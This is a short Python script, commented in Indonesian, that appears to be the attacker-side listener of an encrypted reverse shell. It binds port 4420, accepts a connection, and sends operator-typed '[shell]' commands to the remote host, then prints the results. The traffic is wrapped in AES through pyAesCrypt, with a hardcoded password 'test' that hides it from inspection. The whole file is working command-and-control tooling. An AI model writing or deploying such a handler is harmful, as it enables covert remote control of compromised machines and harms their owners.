#!/usr/bin/env python3
import socket,os
import pyAesCrypt
import io

#Konfigurasi 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4420))
c.listen(1)
s,a = c.accept()

#Set buffer size dan password
bufferSize = 1024
password = 'test'

#Encrypt data
def encryptData(msg):
	pbdata = str.encode(msg)
	fIn = io.BytesIO(pbdata)
	fCiph = io.BytesIO()
	pyAesCrypt.encryptStream(fIn, fCiph, password, bufferSize)
	dataSend = fCiph.getvalue() #Data yg akan dikirim
	return dataSend

# Decrypt data
def decryptData(msg):
	#Inisialisasi Ciphertext
	fCiph = io.BytesIO()
	fDec = io.BytesIO()
	fCiph = io.BytesIO(msg) #Mengubah ke byte
	ctlen = len(fCiph.getvalue())
	fCiph.seek(0)
	pyAesCrypt.decryptStream(fCiph, fDec, password, bufferSize, ctlen) 	#Decrypt stream
	decrypted = str(fDec.getvalue().decode())
	return decrypted

while True:
	#Menerima data
	data = s.recv(1024)
	#Mengecek apakah akhir dari data dengan filter EOFX
	if decryptData(data).endswith("EOFX") == True:
		nextcmd = input("[shell]: ") # Mengambil command selanjutnya selama ada akhiran EOFX
		#Dilakukan pengiriman
		if nextcmd == 'quit':
			print('\nQuitting...')
			s.send(encryptData(nextcmd))
			break
		else: s.send(encryptData(nextcmd))
	#Selama belum menerima akhir dari EOFX 

	else:
		print('\n' + decryptData(data))